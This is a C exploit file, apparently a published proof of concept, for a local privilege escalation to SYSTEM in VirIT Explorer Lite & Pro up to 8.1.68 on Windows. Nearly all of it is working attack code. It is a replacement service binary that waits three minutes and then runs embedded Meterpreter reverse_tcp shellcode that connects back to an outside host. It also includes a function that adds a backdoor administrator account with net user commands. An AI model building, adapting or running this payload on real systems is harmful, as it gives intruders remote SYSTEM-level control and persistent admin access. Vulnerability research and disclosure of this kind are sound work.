/*
Full title:		VirIT Explorer Lite & Pro v.8.1.68 Local Privilege Escalation (System)/Arbitrary Code Execution
Exploit Author:		Paolo Stagno - voidsec@voidsec.com
Vendor Homepage:	http://www.tgsoft.it
Version:		VirIT Explorer Lite & Pro <=v.8.1.68
Tested on:		Windows 7
CVE:			TBD
CVSS v2:          	6.8 (AV:L/AC:L/Au:S/C:C/I:C/A:C/E:H/RL:U/RC:C) - https://nvd.nist.gov/cvss.cfm?calculator&version=2&vector=%28AV:L/AC:L/Au:S/C:C/I:C/A:C/E:H/RL:U/RC:C%29
Category:		local exploits
Platform:		windows
Security Risk:		High
*/
#include <windows.h>
#include <stdio.h>

#define small_sleep 5000
#define big_sleep 180000

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char **argv);
void ControlHandler(DWORD request);
typedef short (CALLBACK * FuncType) (LPCTSTR);

/*Meterpreter reverse payload (windows/meterpreter/reverse_tcp), replace with your own*/
unsigned char r_shell[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x6a\x05\x68\xc0\xa8\x01\x8a\x68\x02"
"\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
"\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x61\x00\x00"
"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83"
"\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a"
"\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57"
"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x22\x58\x68\x00"
"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68"
"\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\xe9\x71\xff\xff"
"\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00"
"\x53\xff\xd5";

int Spawn_Shell(){
	//Spawn the reverse shell
    int (*func)();
    func = (int (*)()) r_shell;
    (int)(*func)();	
}

int Add_Admin(){
	//ADD VoidSec:secret to Local Administrators
	system("net user VoidSec secret /ADD");
	system("net localgroup Administrators VoidSec /ADD"); return 0;
}

int main(){
	SERVICE_TABLE_ENTRY ServiceTable[2];
	ServiceTable[0].lpServiceName = "viritsvclite";
	ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION) ServiceMain;
	ServiceTable[1].lpServiceName = NULL;
	ServiceTable[1].lpServiceProc = NULL;
	StartServiceCtrlDispatcher(ServiceTable);

	return 0;
}

void ServiceMain(int argc, char **argv) {
	ServiceStatus.dwServiceType = SERVICE_WIN32;
	ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	ServiceStatus.dwWin32ExitCode = 0;
	ServiceStatus.dwServiceSpecificExitCode = 0;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;
	hStatus = RegisterServiceCtrlHandler("viritsvclite", (LPHANDLER_FUNCTION) ControlHandler);
	ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	SetServiceStatus(hStatus, &ServiceStatus);
	
	//Big sleep (3m), let Windows start Network, DHCP etc.
	Sleep(big_sleep);
	
	Spawn_Shell();
	//Add_Admin();
	
	//Let our service run instead of kill it (only works with Add_Admin, Spawn_Shell will kill it on exit)
	/*while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
		Sleep(small_sleep);
	}*/
		
	return;
}

void ControlHandler(DWORD request) {
	switch (request) {
		case SERVICE_CONTROL_STOP:
			ServiceStatus.dwWin32ExitCode = 0;
			ServiceStatus.dwCurrentState = SERVICE_STOPPED;
			SetServiceStatus(hStatus, &ServiceStatus);
		return;
		case SERVICE_CONTROL_SHUTDOWN:
			ServiceStatus.dwWin32ExitCode = 0;
			ServiceStatus.dwCurrentState = SERVICE_STOPPED;
			SetServiceStatus(hStatus, &ServiceStatus);
		return;
		default:
		break;
		}
	SetServiceStatus(hStatus, &ServiceStatus);
		
	return;
}